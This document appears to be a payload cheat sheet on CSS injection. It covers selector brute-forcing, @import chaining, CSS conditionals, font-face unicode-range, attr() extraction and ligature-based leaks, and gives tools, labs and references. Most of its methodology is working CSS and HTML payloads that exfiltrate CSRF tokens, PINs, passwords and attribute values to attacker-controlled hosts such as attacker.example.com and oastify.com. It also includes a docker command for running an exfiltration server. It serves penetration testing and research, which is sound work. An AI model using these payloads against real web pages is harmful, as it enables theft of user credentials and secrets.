# CSS Injection

> CSS Injection is a vulnerability that occurs when an application allows untrusted CSS to be injected into a web page. This can be exploited to exfiltrate sensitive data, such as CSRF tokens or other secrets, by manipulating the page layout or triggering network requests based on element attributes.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [CSS Selectors](#css-selectors)
    * [CSS Import at-rule](#css-import-at-rule)
    * [CSS Conditionals](#css-conditionals)
    * [CSS Font-face at-rule](#css-font-face-at-rule)
    * [Attribute Extraction via attr()](#attribute-extraction-via-attr)
    * [Ligatures](#ligatures)
* [Labs](#labs)
* [References](#references)

## Tools

* [hackvertor/blind-css-exfiltration](https://github.com/hackvertor/blind-css-exfiltration) - A tool to exfiltrate unknown web pages using Blind CSS.
* [PortSwigger/css-exfiltration](https://github.com/PortSwigger/css-exfiltration) - Collection of CSS based exfiltration techniques.
* [cgvwzq/css-scrollbar-attack](https://github.com/cgvwzq/css-scrollbar-attack) - PoC for leaking text nodes via CSS injection using scrollbars.
* [d0nutptr/sic](https://github.com/d0nutptr/sic) - Sequential Import Chaining for advanced CSS exfiltration.
* [adrgs/fontleak](https://github.com/adrgs/fontleak) - Tool for fast exfiltration of text using only CSS and Ligatures.

## Methodology

### CSS Selectors

CSS selectors can be used to exfiltrate data. This technique is particularly useful because CSS is often allowed in CSP rules, whereas JavaScript is frequently blocked.

The attack works by brute-forcing a token character by character. Once the first character is identified, the payload is updated to guess the second character, and so on. This often requires an iframe to reload the page with the new payload.

* `input[value^=a]` (prefix attribute selector): Selects elements where the value starts with "a".
* `input[value$=a]` (suffix attribute selector): Selects elements where the value ends with "a".
* `input[value*=a]` (substring attribute selector): Selects elements where the value contains "a".

#### Exfiltration via Background Image

When a selector matches, the browser attempts to load the background image from a URL controlled by the attacker, thereby leaking the character.

```css
input[value^="TOKEN_012"] {
  background-image: url(http://attacker.example.com/?prefix=TOKEN_012);
}
```

```css
input[name="pin"][value="1234"] {
  background: url(https://attacker.com/log?pin=1234);
}
```

**Tips:**

* **Hidden Inputs**: You cannot apply a background image directly to a hidden input field. Instead, use a sibling selector (`+` or `~`) to style a visible element that appears after the hidden input.

```css
input[name="csrf-token"][value^="a"] + input {
  background: url(https://example.com?q=a)
}
```

* **Has Selector**: The `:has()` pseudo-class allows styling a parent element based on its children.

```css
div:has(input[value="1337"]) {
  background:url(/collectData?value=1337);
}
```

* **Concurrency**: Use both prefix and suffix selectors to speed up the guessing process. You can assign the prefix check to one property (e.g., `background`) and the suffix check to another (e.g., `list-style-image` or `border-image`).

### CSS Import at-rule

This technique is known as **Blind CSS Exfiltration**. It relies on importing external stylesheets to trigger callbacks.

```html
<style>@import url(http://attacker.com/staging?len=32);</style>
<style>@import'//YOUR-PAYLOAD.oastify.com'</style>
```

Frames do not always need to be reloaded to reevaluate CSS. The `@import` rule allows for latency; the browser will process the import and apply the new styles.

#### Sequential Import Chaining (SIC)

SIC allows an attacker to chain multiple extraction steps without reloading the page:

1. Inject an initial `@import` rule pointing to a staging payload.
2. The staging payload holds the connection open (long-polling) while generating the next specific payload.
3. When a CSS rule matches (e.g., a character is found via `background-image`), the browser makes a request.
4. The server detects this request and generates the next `@import` rule to continue the chain.

### CSS Conditionals

#### Inline Style Exfiltration

This advanced technique leverages CSS conditionals (like `if()`) and variables to perform logic directly within a style attribute.

Example: Stealing a `data-uid` attribute if it matches a value between 1 and 10.

```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```

### CSS Font-face at-rule

> The @font-face CSS at-rule specifies a custom font with which to display text; the font can be loaded from either a remote server or a locally-installed font on the user's own computer. - Mozilla

The `unicode-range` property allows specific fonts to be used for specific characters. We can abuse this to detect if a specific character is present on the page.

If the character "A" is present, the browser attempts to load the font from `/?A`. If "C" is not present, that request is never made.

```html
<style>
@font-face{ font-family:poc; src: url(http://attacker.example.com/?A); /* fetched */ unicode-range:U+0041; }
@font-face{ font-family:poc; src: url(http://attacker.example.com/?B); /* fetched too */ unicode-range:U+0042; }
@font-face{ font-family:poc; src: url(http://attacker.example.com/?C); /* not fetched */ unicode-range:U+0043; }
#sensitive-information{ font-family:poc; }
</style>
<p id="sensitive-information">AB</p>
```

**Limitations:**

* It cannot distinguish repeated characters (e.g., "AA" triggers the request once).
* It does not determine the order of characters.
* Despite these limitations, it is a very reliable oracle for checking character existence.
* Chrome checked this as "WontFix": [issues/40083029](https://issues.chromium.org/issues/40083029)

### Attribute Extraction via attr()

The CSS `attr()` function allows CSS to retrieve the value of an attribute of the selected element.  With recent updates (see [Advanced attr()](https://developer.chrome.com/blog/advanced-attr)), this function can be used to extract input's value.

Target HTML:

```html
<html>
    <head>
        <link rel="stylesheet" href="http://attacker.local/index.css">
    </head>
    <body>
        <input type="text" name="password" value="supersecret">
    </body>
</html>
```

`index.css` (hosted by attacker):

```css
input[name="password"] {
  background: image-set(attr(value))
}
```

When `image-set()` is used with `attr()`, the browser may attempt to interpret the attribute value as a URL. If the stylesheet is cross-domain, the relative URL is resolved against the stylesheet's origin, not the page's origin.

Resulting request on attacker's server:

```ps1
10.10.10.10 - - [15/Feb/2026 16:33:21] "GET /supersecret HTTP/1.1" 404 -
```

### Ligatures

This technique exploits custom fonts and ligatures. A ligature combines multiple characters into a single glyph. By creating a custom font where specific character sequences (e.g., specific text content) produce a ligature with a huge width, we can detect the change in layout.

1. Create a custom font with ligatures for target strings.
2. Use media queries or scrollbars to detect if the rendered width of the element has changed.

```ps1
docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest
```

Payload example using `fontleak` with a custom selector, parent element, and alphabet.
**Warning**: The CSS selector must match exactly one element in the target page.

```html
<style>@import url("http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789");</style>
```

## Labs

* [Dojo #25 RootCSS - YesWeHack](https://dojo-yeswehack.com/challenge-of-the-month/dojo-25)

## References

* [0CTF 2023 Writeups - Web - newdiary - aszx87410 - December 11, 2023](https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/)
* [Bench Press: Leaking Text Nodes with CSS - pspaul - October 20, 2024](https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/)
* [Better Exfiltration via HTML Injection - d0nut - April 11, 2019](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [Blind CSS Exfiltration: exfiltrate unknown web pages - Gareth Heyes - December 5, 2023](https://portswigger.net/research/blind-css-exfiltration)
* [CSS based Attack: Abusing unicode-range of @font-face - Masato Kinugawa - October 23, 2015](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)
* [CSS Data Exfiltration to Steal OAuth Token - - September 13, 2025](https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token)
* [CSS Injection - xsleaks.dev - May 9, 2025](https://xsleaks.dev/docs/attacks/css-injection/)
* [CSS Injection Attacks or how to leak content with <style> - Pepe Vila - 2019](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)
* [CSS Injection: Attacking with Just CSS (Part 2) - aszx87410 - September 24, 2023](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection-2/)
* [Fontleak: exfiltrating text using CSS and Ligatures - Dragos Albastroiu - April 16, 2025](https://adragos.ro/fontleak/)
* [How you can steal private data through CSS injection - invicti - April 23, 2018](https://www.invicti.com/blog/web-security/private-data-stolen-exploiting-css-injection)
* [Inline Style Exfiltration: leaking data with chained CSS conditionals - Gareth Heyes - August 26, 2025](https://portswigger.net/research/inline-style-exfiltration)
